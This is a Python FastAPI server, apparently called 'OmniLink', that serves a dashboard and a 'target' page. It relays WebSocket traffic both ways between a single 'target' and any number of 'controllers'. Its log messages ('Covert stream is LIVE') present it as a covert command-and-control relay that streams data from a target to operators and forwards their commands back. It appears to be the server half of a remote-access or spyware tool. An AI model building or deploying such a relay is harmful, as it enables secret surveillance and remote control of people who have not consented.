import os
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse
import uvicorn

app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

target_socket = None
controller_sockets = []

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

@app.get("/")
async def root():
    return FileResponse(os.path.join(BASE_DIR, "dashboard.html"))

@app.get("/dashboard")
async def get_dashboard():
    return FileResponse(os.path.join(BASE_DIR, "dashboard.html"))

@app.get("/target")
async def get_target():
    return FileResponse(os.path.join(BASE_DIR, "target_web.html"))

@app.websocket("/ws/target")
async def target_endpoint(websocket: WebSocket):
    global target_socket
    await websocket.accept()
    target_socket = websocket
    print("[+] Target connected. Covert stream is LIVE.")
    
    try:
        while True:
            data = await websocket.receive_text()
            # Forward the data to whoever is watching (controllers)
            for ctrl in controller_sockets:
                try:
                    await ctrl.send_text(data)
                except Exception:
                    pass
    except WebSocketDisconnect:
        print("[-] Target disconnected.")
        target_socket = None

@app.websocket("/ws/controller")
async def controller_endpoint(websocket: WebSocket):
    await websocket.accept()
    controller_sockets.append(websocket)
    print("[*] Controller connected.")
    
    try:
        while True:
            # Receive commands from controller and forward to target if needed
            data = await websocket.receive_text()
            if target_socket:
                try:
                    await target_socket.send_text(data)
                except Exception:
                    pass
    except WebSocketDisconnect:
        print("[-] Controller disconnected.")
        if websocket in controller_sockets:
            controller_sockets.remove(websocket)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    print(f"OmniLink Server ONLINE on port {port}...")
    uvicorn.run("server:app", host="0.0.0.0", port=port, reload=False)

